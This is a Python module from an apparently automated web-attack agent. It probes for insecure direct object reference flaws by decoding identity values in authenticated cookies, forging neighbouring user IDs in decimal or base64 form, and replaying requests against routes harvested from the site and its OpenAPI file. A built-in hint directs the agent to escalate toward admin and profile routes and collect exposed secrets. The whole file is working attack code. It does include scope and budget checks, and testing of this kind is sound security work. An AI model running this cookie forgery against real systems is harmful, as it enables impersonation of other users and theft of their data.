from __future__ import annotations

import base64
import json
import re
from urllib.parse import parse_qsl, quote, urlsplit, urlunsplit

from ravage.agent_core.agent_state import AgentState
from ravage.probes.specialists.idor_auth import _cookie_pair_values, _idor_auth_header_contexts
from ravage.probes.specialists.idor_routes import (
    _authenticated_object_seed_urls,
    _canonical_url_for_idor,
)
from ravage.probes.specialists.idor_signals import _idor_access_signal
from ravage.probes.specialists.shared import _dedupe, _int_value, _name_looks_idor
from ravage.web_core.http_probe import ProbeResponse, ProbeSession, response_secrets
from ravage.web_core.proof_recognizer import recognize_proofs


def _probe_cookie_identity_idor(
    session: ProbeSession,
    state: AgentState,
    *,
    budget: int,
) -> tuple[list[dict[str, object]], list[dict[str, object]], int]:
    auth_contexts = _idor_auth_header_contexts(state)
    if not auth_contexts:
        return [], [], budget

    findings: list[dict[str, object]] = []
    requests: list[dict[str, object]] = []
    baseline_cache: dict[tuple[str, str], ProbeResponse] = {}
    for auth_headers in auth_contexts[:3]:
        cookie_header = str(auth_headers.get("Cookie") or auth_headers.get("cookie") or "")
        cookie_pairs = _cookie_header_pairs(cookie_header)
        variants = _cookie_identity_variants(cookie_pairs)
        if not cookie_pairs or not variants:
            continue
        route_templates, template_requests, budget = _cookie_identity_route_templates(
            session,
            state,
            auth_headers=auth_headers,
            identities=_variant_original_identities(variants),
            budget=budget,
        )
        requests.extend(template_requests)
        if not route_templates:
            continue
        auth_key = json.dumps(sorted(auth_headers.items()))
        for variant in variants[:32]:
            if budget <= 0:
                return findings, requests, budget
            candidate_headers = _cookie_identity_headers(auth_headers, cookie_pairs, variant)
            for template in route_templates[:32]:
                if budget <= 1:
                    return findings, requests, budget
                baseline_url = _cookie_identity_template_url(
                    template, str(variant["original_identity"])
                )
                candidate_url = _cookie_identity_template_url(
                    template, str(variant["candidate_identity"])
                )
                if not session.in_scope(baseline_url) or not session.in_scope(candidate_url):
                    continue
                baseline_key = (auth_key, _canonical_url_for_idor(baseline_url))
                baseline = baseline_cache.get(baseline_key)
                if baseline is None:
                    baseline = session.get(baseline_url, headers=auth_headers or None)
                    budget -= 1
                    baseline_cache[baseline_key] = baseline
                    requests.append(
                        baseline.summary(body_chars=220)
                        | {
                            "probe_kind": "idor_cookie_identity_baseline",
                            "url": baseline_url,
                            "cookie": variant["cookie_name"],
                            "identity": variant["original_identity"],
                            "template": template,
                        }
                    )
                response = session.get(candidate_url, headers=candidate_headers)
                budget -= 1
                requests.append(
                    response.summary(body_chars=360)
                    | {
                        "probe_kind": "idor_cookie_identity_candidate",
                        "url": candidate_url,
                        "cookie": variant["cookie_name"],
                        "candidate_identity": variant["candidate_identity"],
                        "strategy": variant["strategy"],
                        "template": template,
                    }
                )
                signal = _idor_access_signal(
                    baseline=baseline,
                    response=response,
                    original_id=str(variant["original_identity"]),
                    candidate_id=str(variant["candidate_identity"]),
                )
                proofs = recognize_proofs(response.body)
                matches = response_secrets(response)
                if not (proofs or matches or signal):
                    continue
                finding_type = (
                    "idor_cookie_identity_exposed_secret"
                    if proofs or matches
                    else "idor_cookie_identity_signal"
                )
                findings.append(
                    {
                        "type": finding_type,
                        "cookie": variant["cookie_name"],
                        "strategy": variant["strategy"],
                        "original_identity": variant["original_identity"],
                        "candidate_identity": variant["candidate_identity"],
                        "url": candidate_url,
                        "signal": signal or {"kind": "cookie_identity_route_accessible"},
                        "proofs": proofs,
                        "matches": matches,
                        "baseline": baseline.summary(body_chars=300),
                        "response": response.summary(body_chars=520),
                        "replay": {
                            "method": "GET",
                            "url": candidate_url,
                            "headers": candidate_headers,
                        },
                        "next": (
                            "The authenticated cookie appears to encode identity. Continue mutating this cookie and "
                            "matching object-route IDs together, then read profile/company/admin/API routes for proof."
                        ),
                    }
                )
                if proofs:
                    return findings, requests, budget
                break
    return findings, requests, budget


def _cookie_identity_route_templates(
    session: ProbeSession,
    state: AgentState,
    *,
    auth_headers: dict[str, str],
    identities: list[str],
    budget: int,
) -> tuple[list[str], list[dict[str, object]], int]:
    requests: list[dict[str, object]] = []
    templates: list[str] = []
    for url in [session.target_url, *_authenticated_object_seed_urls(session, state)]:
        templates.extend(_cookie_identity_templates_from_url(session.absolute(url), identities))
    if budget > 0:
        openapi_url = session.absolute("/openapi.json")
        openapi = session.get(openapi_url, headers=auth_headers or None)
        budget -= 1
        requests.append(
            openapi.summary(body_chars=260)
            | {
                "probe_kind": "idor_cookie_identity_openapi",
                "url": openapi_url,
            }
        )
        if openapi.status == 200:
            templates.extend(_cookie_identity_templates_from_openapi(session, openapi.body))
    ordered = _in_scope_cookie_identity_templates(session, templates)
    ordered.sort(key=_cookie_identity_template_priority)
    return ordered[:48], requests, budget


def _variant_original_identities(variants: list[dict[str, object]]) -> list[str]:
    identities: list[str] = []
    for item in variants:
        identities.append(str(item["original_identity"]))
    return _dedupe(identities)


def _in_scope_cookie_identity_templates(session: ProbeSession, templates: list[str]) -> list[str]:
    ordered: list[str] = []
    for template in _dedupe(templates):
        test_url = _cookie_identity_template_url(template, "1")
        if session.in_scope(test_url):
            ordered.append(template)
    return ordered


def _cookie_identity_templates_from_url(url: str, identities: list[str]) -> list[str]:
    templates = [_canonical_url_for_idor(url)]
    try:
        parts = urlsplit(url)
    except ValueError:
        return templates
    identity_set = set(identities)
    segments = parts.path.split("/")
    for index, segment in enumerate(segments):
        if segment not in identity_set and not re.fullmatch(r"\d{1,12}", segment):
            continue
        next_segments = list(segments)
        next_segments[index] = "{id}"
        templates.append(
            urlunsplit((parts.scheme, parts.netloc, "/".join(next_segments), parts.query, ""))
        )
    query = parse_qsl(parts.query, keep_blank_values=True)
    for index, (name, value) in enumerate(query):
        if value not in identity_set and not (
            _name_looks_idor(name, url) and re.fullmatch(r"\d{1,12}", value)
        ):
            continue
        next_query = list(query)
        next_query[index] = (name, "{id}")
        query_text = _encoded_query_text(next_query)
        templates.append(
            urlunsplit((parts.scheme, parts.netloc, parts.path or "/", query_text, ""))
        )
    return templates


def _encoded_query_text(query: list[tuple[str, str]]) -> str:
    encoded: list[str] = []
    for key, raw in query:
        encoded_key = quote(key, safe="")
        encoded_value = quote(raw, safe="{}")
        encoded.append(f"{encoded_key}={encoded_value}")
    return "&".join(encoded)


def _cookie_identity_templates_from_openapi(session: ProbeSession, body: str) -> list[str]:
    try:
        payload = json.loads(body)
    except json.JSONDecodeError:
        return []
    paths = payload.get("paths")
    if not isinstance(paths, dict):
        return []
    templates: list[str] = []
    for raw_path in paths:
        path = str(raw_path)
        if not _openapi_path_looks_identity_object(path):
            continue
        template_path = re.sub(
            r"\{[^}/]*(?:id|user|account|company|tenant|org|member)[^}/]*\}",
            "{id}",
            path,
            flags=re.I,
        )
        if "{id}" not in template_path:
            continue
        templates.append(session.absolute(template_path))
    return templates


def _openapi_path_looks_identity_object(path: str) -> bool:
    lowered = path.lower()
    if "{" not in lowered or "}" not in lowered:
        return False
    return _contains_marker(
        lowered,
        (
            "account",
            "company",
            "customer",
            "dashboard",
            "document",
            "file",
            "invoice",
            "job",
            "member",
            "order",
            "org",
            "profile",
            "record",
            "tenant",
            "user",
        ),
    )


def _cookie_identity_template_url(template: str, identity: str) -> str:
    return template.replace("{id}", quote(identity, safe=""))


def _cookie_identity_template_priority(template: str) -> tuple[int, str]:
    lowered = template.lower()
    score = 0
    if "{id}" in template:
        score -= 20
    if _contains_marker(
        lowered,
        ("profile", "account", "company", "user", "dashboard", "admin", "job"),
    ):
        score -= 10
    if _contains_marker(lowered, ("openapi", "docs", "redoc", "token", "login")):
        score += 15
    return score, template


def _cookie_header_pairs(cookie_header: str) -> list[tuple[str, str]]:
    pairs: list[tuple[str, str]] = []
    for pair in _cookie_pair_values(cookie_header):
        name, value = pair.split("=", 1)
        pairs.append((name.strip(), value.strip()))
    return pairs


def _cookie_identity_variants(cookie_pairs: list[tuple[str, str]]) -> list[dict[str, object]]:
    variants: list[dict[str, object]] = []
    seen: set[tuple[str, str]] = set()
    for name, value in cookie_pairs:
        for variant in _cookie_value_identity_variants(name, value):
            key = (str(variant["cookie_name"]), str(variant["candidate_value"]))
            if key in seen:
                continue
            seen.add(key)
            variants.append(variant)
    variants.sort(key=_cookie_identity_variant_priority)
    return variants


def _cookie_value_identity_variants(name: str, value: str) -> list[dict[str, object]]:
    inner, quote_char = _unquote_cookie_value(value)
    token_prefix = ""
    token = inner
    bearer_match = re.match(r"(?i)^(bearer\s+)(.+)$", inner.strip())
    if bearer_match:
        token_prefix = bearer_match.group(1)
        token = bearer_match.group(2).strip()

    decoded = _cookie_identity_decode(token)
    if decoded is None:
        decoded = _cookie_identity_decode(inner)
        token_prefix = ""
        token = inner
    if decoded is None:
        return []
    original_identity, strategy = decoded
    if not _cookie_name_looks_identity(name) and strategy == "decimal":
        return []

    variants: list[dict[str, object]] = []
    for candidate in _numeric_identity_candidates_for_cookie(int(original_identity)):
        encoded = _cookie_identity_encode(candidate, strategy=strategy, reference=token)
        candidate_inner = f"{token_prefix}{encoded}"
        candidate_value = _requote_cookie_value(candidate_inner, quote_char)
        variants.append(
            {
                "cookie_name": name,
                "original_value": value,
                "candidate_value": candidate_value,
                "original_identity": str(original_identity),
                "candidate_identity": str(candidate),
                "strategy": _cookie_identity_strategy_name(token_prefix, strategy),
            }
        )
    return variants


def _requote_cookie_value(candidate_inner: str, quote_char: str) -> str:
    if quote_char:
        return f"{quote_char}{candidate_inner}{quote_char}"
    return candidate_inner


def _cookie_identity_strategy_name(token_prefix: str, strategy: str) -> str:
    if token_prefix and strategy.startswith("base64"):
        return "bearer_base64_identity"
    return f"{strategy}_identity"


def _unquote_cookie_value(value: str) -> tuple[str, str]:
    text = value.strip()
    if len(text) >= 2 and text[0] == text[-1] and text[0] in {"'", '"'}:
        return text[1:-1], text[0]
    return text, ""


def _cookie_identity_decode(value: str) -> tuple[int, str] | None:
    text = value.strip()
    if re.fullmatch(r"\d{1,12}", text):
        return int(text), "decimal"
    decoded = _decode_base64_cookie_text(text)
    if decoded is not None and re.fullmatch(r"\d{1,12}", decoded):
        return int(decoded), _base64_cookie_strategy(text)
    return None


def _base64_cookie_strategy(text: str) -> str:
    if "-" in text or "_" in text:
        return "base64url"
    return "base64"


def _decode_base64_cookie_text(value: str) -> str | None:
    text = value.strip()
    if not re.fullmatch(r"[A-Za-z0-9_-]{1,64}={0,2}", text):
        return None
    padded = text + ("=" * (-len(text) % 4))
    try:
        raw = base64.urlsafe_b64decode(padded.encode("ascii"))
    except Exception:  # noqa: BLE001 - arbitrary cookie text.
        return None
    try:
        decoded = raw.decode("utf-8")
    except UnicodeDecodeError:
        return None
    return decoded.strip()


def _cookie_identity_encode(identity: int, *, strategy: str, reference: str) -> str:
    text = str(identity)
    if strategy == "decimal":
        return text
    encoded = base64.urlsafe_b64encode(text.encode("ascii")).decode("ascii")
    if strategy == "base64" and "-" not in reference and "_" not in reference:
        encoded = base64.b64encode(text.encode("ascii")).decode("ascii")
    if not reference.endswith("="):
        encoded = encoded.rstrip("=")
    return encoded


def _numeric_identity_candidates_for_cookie(current: int) -> list[int]:
    candidates: list[int] = []
    for offset in (
        1,
        -1,
        2,
        -2,
        3,
        -3,
        4,
        -4,
        5,
        -5,
        8,
        -8,
        10,
        -10,
        16,
        -16,
        20,
        -20,
        25,
        -25,
        32,
        -32,
    ):
        candidate = current + offset
        if candidate >= 0:
            candidates.append(candidate)
    candidates.extend([0, 1, 2, 3, 4, 5, 10, 100, 1000])
    deduped = _deduped_int_candidates(candidates)
    return _candidates_except_current(deduped, current)[:32]


def _deduped_int_candidates(candidates: list[int]) -> list[int]:
    candidate_strings: list[str] = []
    for item in candidates:
        candidate_strings.append(str(item))
    deduped: list[int] = []
    for value in _dedupe(candidate_strings):
        deduped.append(int(value))
    return deduped


def _candidates_except_current(candidates: list[int], current: int) -> list[int]:
    filtered: list[int] = []
    for candidate in candidates:
        if candidate != current:
            filtered.append(candidate)
    return filtered


def _cookie_name_looks_identity(name: str) -> bool:
    lowered = name.lower().replace("-", "_")
    if lowered in {"id", "sid"}:
        return True
    return _contains_marker(
        lowered,
        (
            "access",
            "account",
            "auth",
            "company",
            "customer",
            "identity",
            "member",
            "org",
            "session",
            "tenant",
            "token",
            "uid",
            "user",
        ),
    )


def _cookie_identity_variant_priority(item: dict[str, object]) -> tuple[int, int, str]:
    cookie_name = str(item.get("cookie_name") or "")
    candidate = _int_value(item.get("candidate_identity"), default=999999)
    score = _cookie_name_priority(cookie_name)
    if "bearer" in str(item.get("strategy") or ""):
        score -= 4
    return score, candidate, cookie_name


def _cookie_name_priority(cookie_name: str) -> int:
    if _cookie_name_looks_identity(cookie_name):
        return 0
    return 8


def _cookie_identity_headers(
    auth_headers: dict[str, str],
    cookie_pairs: list[tuple[str, str]],
    variant: dict[str, object],
) -> dict[str, str]:
    headers = _headers_without_cookie(auth_headers)
    cookie_name = str(variant["cookie_name"])
    candidate_value = str(variant["candidate_value"])
    headers["Cookie"] = _mutated_cookie_header(cookie_pairs, cookie_name, candidate_value)
    return headers


def _headers_without_cookie(auth_headers: dict[str, str]) -> dict[str, str]:
    headers: dict[str, str] = {}
    for name, value in auth_headers.items():
        if name.lower() != "cookie":
            headers[name] = value
    return headers


def _mutated_cookie_header(
    cookie_pairs: list[tuple[str, str]],
    cookie_name: str,
    candidate_value: str,
) -> str:
    pairs: list[str] = []
    for name, value in cookie_pairs:
        if not name or not value:
            continue
        replacement_value = value
        if name == cookie_name:
            replacement_value = candidate_value
        pairs.append(f"{name}={replacement_value}")
    return "; ".join(pairs)


def _contains_marker(text: str, markers: tuple[str, ...]) -> bool:
    for marker in markers:
        if marker in text:
            return True
    return False
